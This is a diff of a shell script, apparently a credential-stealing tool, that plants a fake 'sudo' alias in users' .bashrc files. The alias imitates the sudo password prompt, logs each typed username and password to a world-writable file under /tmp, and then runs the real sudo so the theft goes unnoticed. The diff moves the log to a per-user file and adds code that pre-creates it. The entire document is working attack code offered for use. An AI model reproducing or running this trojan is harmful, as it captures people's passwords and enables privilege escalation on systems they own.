@@ -98,10 +98,32 @@ else
                 #echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) \$@'" >> $dir/.bashrc
                 
                 # no need to type password twice
-                echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
+                #echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
+                
+                  file_path="/tmp/sk-crds-$tuser.log"
+
+                  # Check if the file exists
+                  if [ ! -f "$file_path" ]; then
+                    touch /tmp/sk-crds-$tuser.log
+                    chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null
+                  fi
+                
+
+                echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
+
+                
                 else
                 # Password:
-                echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
+
+                 # Check if the file exists
+                  if [ ! -f "$file_path" ]; then
+                    touch /tmp/sk-crds-$tuser.log
+                    chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null
+                  fi
+
+
+                #echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null && echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
+                echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; echo \$password | $(which sudo) -S \$@'" >> $dir/.bashrc
  
                 fi
 
@@ -113,12 +135,30 @@ else
   *)         
   if [ "$ver" = "new" ]; then
      # [sudo] password for $USER:
-     echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
+     #echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
      
+    # Check if the file exists
+    if [ ! -f "$file_path" ]; then
+      touch /tmp/sk-crds-$tuser.log
+      chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null
+    fi
+
+     echo "alias sudo='echo -n \"[sudo] password for \$USER: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
+
      source /home/$tuser/.bashrc
    else
+
+       # Check if the file exists
+    if [ ! -f "$file_path" ]; then
+      touch /tmp/sk-crds-$tuser.log
+      chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null
+    fi
+    
      # Password:
-     echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
+     #echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; chmod 777 /tmp/sk-crds-$tuser.log 2>/dev/null && echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
+     echo "alias sudo='echo -n \"Password: \" && read -s -r password && echo -e \"\\n\" && echo \"\$USER:\$password\" >>/tmp/sk-crds-$tuser.log; echo \$password | $(which sudo) -S \$@'" >> /home/$tuser/.bashrc
+
+     
      source /home/$tuser/.bashrc
   fi
   sleep 0.05
